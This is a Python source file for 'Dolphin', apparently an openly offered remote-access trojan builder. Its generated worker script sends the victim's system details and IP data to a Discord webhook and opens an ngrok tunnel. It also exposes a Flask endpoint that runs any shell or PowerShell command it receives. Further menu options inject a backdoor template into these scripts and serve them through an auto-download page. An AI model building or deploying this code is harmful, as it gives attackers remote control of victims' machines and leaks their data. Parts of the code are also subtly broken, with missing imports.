import subprocess
import sys

# List of required packages
required_modules = [
    "os",
    "sys",
    "time",
    "colorama",
    "subprocess",
    "flask",
    "tkinter",
    "requests"
]

# Mapping for pip-installable modules
installable_modules = {
    "colorama": "colorama",
    "flask": "flask",
    "requests": "requests",
    "tkinter": "tk"
}

# Check and install missing modules
for module in required_modules:
    try:
        if module == "tkinter":
            import tkinter
        else:
            __import__(module)
    except ImportError:
        if module in installable_modules:
            print(f"[!] '{module}' not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", installable_modules[module]])
        else:
            print(f"[x] Cannot auto-install module: {module}")
            sys.exit(1)

# Proceed with imports after all are ensured
import os
import sys
from time import sleep
from colorama import init as colorama_init
import subprocess
from flask import Flask, request, jsonify, send_from_directory, render_template_string
import tkinter as tk
from tkinter import scrolledtext, simpledialog
import requests
import time

# Initialize colorama
colorama_init()

print("[✔] All modules are ready.")
app = Flask(__name__)

try:
    os.system("clear")
except:
    os.system("cls")
    
current_time = strftime('%H:%M:%S %p')
record_1 =[["script_name.py"],["username"],["hook_url"]]
running = True

dolphin = f"""{Fore.BLUE}
                    YAao,
                    Y8888b,
                  ,oA8888888b,
            ,aaad8888888888888888bo,
         ,d888888888888888888888888888b,
       ,888888888888888888888888888888888b,
      d8888888888888888888888888888888888888,
     d888888888888888888888888888888888888888b
    d888888P'                    `Y888888888888,
    88888P'                    Ybaaaa8888888888l
   a8888'                      `Y8888P' `V888888
 d8888888a                                `Y8888
AY/'' `\Y8b                                 ``Y8b
Y'      `YP                                    ~~
         `'
"""
part1 = """
from flask import Flask, request, jsonify
import random
import json
import socket
import os
import platform
import requests
import subprocess
import time
import dhooks
from dhooks import *
import signal
import sys

app = Flask(__name__)

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")

username = "{username}"
hook_url = "{hook_url}"
live_execute = "{hook_url}"
hook2 = Webhook(live_execute)
hook = Webhook(hook_url)

"""
part2 = """
current_directory = os.getcwd()

def start_ngrok():
    try:
        ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        hook.send("```Waiting for ngrok to start...```")
        time.sleep(10)
    except:
        print("ngrok not found or not connected to the internet")
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json().get('tunnels', [])
        if tunnels:
            public_url = tunnels[0]['public_url']
            hook.send(f"```json{public_url}```")
            return public_url, ngrok_process
        else:
            hook.send("No tunnels found.")
            ngrok_process.terminate()
            return None, ngrok_process
    except Exception as e:
        hook.send(f"Error retrieving public URL: {e}")
        ngrok_process.terminate()
        return None, ngrok_process

def gather_system_info():
    try:
        response = requests.get("http://ip-api.com/json/?fields=61439")
        ip_data = response.json()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        public_ip = ip_data.get('query', 'N/A')
    
        system_data = platform.uname()
        system_info = {
            "Node": system_data.node,
            "System": system_data.system,
            "Machine": system_data.machine,
            "Release": system_data.release,
            "Version": system_data.version,
            "Local IP": local_ip
        }
    
        hook.send(f"```json{json.dumps(system_info, indent=4)}```")
        hook.send(f"```json{json.dumps(ip_data, indent=4)}```")
        return public_ip, ip_data, system_info
    except:
        print("Failed to connect to the Internet")

gather_system_info()
ngrok_url, ngrok_process = start_ngrok()
time.sleep(5)

@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.get_json()
    command = data.get('command', '')

    global current_directory

    try:
        if command.lower().startswith("cd "):
            new_dir = command.split(" ", 1)[1]
            try:
                os.chdir(new_dir)
                current_directory = os.getcwd()
                return jsonify({'result': f"Changed directory to {current_directory}"})
            except FileNotFoundError:
                return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
            except PermissionError:
                return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
        
        # Handle python3 script execution
        elif command.lower().startswith("python3 "):
            scripty = command.split(" ", 1)[1]
            try:
                process = subprocess.Popen(['python3', scripty], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    return jsonify({'result': stdout.strip()})
                else:
                    return jsonify({'error': stderr.strip()}), 400
            except Exception as e:
                return jsonify({'error': f"Failed to execute script: {str(e)}"}), 500
        
        # Handle general commands
        if platform.system() == 'Windows':
            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
        
        # Prepare response
        if result.returncode == 0:
            return jsonify({'result': result.stdout.strip()})
        else:
            return jsonify({'error': result.stderr.strip()}), 400

    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
@app.route('/update_username', methods=['POST'])
def update_username():
    global username
    new_username = request.json.get('username')
    if new_username:
        username = new_username
        return jsonify({"message": "Username updated", "new_username": username}), 200
    return jsonify({"message": "Username not provided"}), 400

@app.route('/get_username', methods=['GET'])
def get_username():
    return jsonify({"username": username}), 200

@app.route('/operating_system', methods=['GET'])
def get_operating_system():
    try:
        operating_system = platform.system()
        return jsonify({"OPERATING_SYSTEM": operating_system}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/pwd', methods=['GET'])
def get_pwd():
    current_directory = os.getcwd()  
    return jsonify({"current_dir": current_directory}), 200

def cleanup(signum, frame):
    hook.send(f"```{username} is offline.```")
    try:
        hook.send("Trying to bring ", username ,"online")
        os.system("python3 app.py")
    except:
        hook.send("Failure...")
    ngrok_process.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
    """
########################################^^^^^^ whole main app.py script
def menu():
    os.system("clear")
    print(dolphin)
    print(f"{Fore.MAGENTA}   https://github.com/ArcticHonour/Dolphin/")
    print(f"{Fore.YELLOW}                 {current_time}{Fore.BLUE}")
    print(f"{Fore.GREEN}\n-------Dolphin -------")
    print("[1] run Terminal Script")
    print("[2] Create Worker Script")
    print("[3] show my scripts")
    print("[4] clear pref/scripts.txt")
    print("[5] create backdoor script")
    print("[6] show menu")
    print("[7] create downloadable link")
    print("[99] Exit")
    print("[100] Restart")
    print("")


def show_menu():  
    choice = input(">>:")
    
    if choice == '1':
        print("Starting the Terminal ...\n")
        try:
            command = ["python3", "pref/Terminal.py"]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"Terminal now running with PID {process.pid}...\n")
            print(f"If there is no Terminal on your screen make sure you have the Terminal.py script\nIf this is not the case then Either update repository immidiently or Get the Terminal script from github\n\nhttps://github.com/ArcticHonour/Dolphin/\n")
        except Exception as e:
            print(e)
        start_master()
    elif choice == '2':
        start_worker()
    elif choice == '3':
        try:
            file = open("pref/scripts.txt", "r")
            data = file.read()
            print(data)
            file.close()
        except:
            file = open("pref/scripts.txt", "w")
            file.write(str(record_1))
            file.close()
            file = open("pref/scripts.txt", "r")
            data = file.read()
            file.close()
            print(data)
    elif choice == '4':
        try:
            file = open("pref/scripts.txt", "w")
            file.write("")
            file.close()
            print("succesfully cleared pref/scripts.txt")
        except:
            print("Error, no pref/pref/scripts.txt found")
    elif choice == '5':
        backdoor()
    elif choice == '6':
        menu()
    elif choice == "7":
        link()
    elif choice == '99':
        print("Exiting the system...")
        exit()
    elif choice == "clear":
        os.system("clear")
        menu()
    elif choice == "100":
        exit()
    else:
        os.system(choice)
        show_menu()

def start_master():
    print("\nMaster script is running...")

def start_worker():
    script_name = input("Enter name of file (e.g., worker_script): ")
    if script_name[len(script_name)-3:len(script_name)] != ".py":
        script_name = script_name + ".py"
    username = input("Enter the username for the worker: ")
    hook_url = input("Enter the webhook URL: ")
    array = [[script_name],[username],[hook_url]]

    template = part1.format(username=username, hook_url=hook_url,)
    script = template + part2
    try:
        file = open(f"workers/{script_name}", "w")
        file.write(script)
        print(f"Worker script '{script_name}' has been created with the username '{username}' and webhook URL {hook_url}, saved in workers.")
        file.close()
    except Exception as e:
        print(f"error {e}")
        
    try:
        file = open("pref/scripts.txt", "a")
        print("a")
        file.write("\n")
        file.write(str(array))
        file.close()
    except:
        file = open("pref/scripts.txt", "w")
        print("B")
        file.write("\n")
        file.write(str(record_1))
        file.close()
        file = open("pref/scripts.txt", "a")
        file.write("\n")
        file.write(str(array))
        file.close()


def link():
    os.system("ls workers")
    script_name = input("Enter the name of your script for download: ").strip()
    prt = int(input("Input port number"))
    if not script_name.endswith(".py"):
        script_name += ".py"

    # Generate HTML redirect content
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=/{script_name}" />
</head>
<body>
    <p>If the download doesn't start automatically, <a href="/{script_name}">click here</a>.</p>
</body>
</html>"""

    # Save HTML file inside a temporary folder like 'downloads/'
    html_file_path = f"downloads/{script_name}.html"
    os.makedirs("downloads", exist_ok=True)
    with open(html_file_path, "w") as f:
        f.write(html_content)

    print(f"\nDownload link ready: http://localhost:8080/{script_name}.html")

    # Define Flask routes inside the function
    @app.route(f"/{script_name}")
    def serve_script():
        return send_from_directory("workers", script_name, as_attachment=True)

    @app.route(f"/{script_name}.html")
    def serve_html():
        return render_template_string(html_content)

    app.run(host='0.0.0.0', port=prt, debug=True)
    
def backdoor():
    os.system("ls workers")
    script_name = input("Enter the name of your script name:")
    if script_name[len(script_name)-3:len(script_name)] != ".py":
        script_name = script_name + ".py"
    try:
        file =  open(f"workers/{script_name}", "r")
        contents = file.read()
        file.close()
        file = open("pref/temp.py", "r")
        backdoor_temp = file.read()
        backdoor_script = backdoor_temp + contents
        file.close()
        file = open(f"workers/{script_name}", "w")
        file.write(backdoor_script)
        print(f"Backdoor added to {script_name}.")
    except FileNotFoundError:
        print(f"File {script_name} or 'temp.py' not found.")
    except Exception as e:
        print(f"Error adding backdoor: {e}")
        file.close()
        
def loading_animation():
    import time
    """
    Displays a rotating loading animation in the console.

    Args:
        duration (int): The duration for the animation in seconds.
    """
    animation = "|/-\\"
    end_time = time.time() + 5
    idx = 0

    while time.time() < end_time:
        # Print the current animation character and flush output
        sys.stdout.write(f"\rLoading {animation[idx % len(animation)]}")
        sys.stdout.flush()
        time.sleep(0.3)
        idx += 1

    sys.stdout.write("\rLoading complete!   \n")
    time.sleep(1)
    menu()
    
loading_animation()
menu()
while running:
    show_menu()
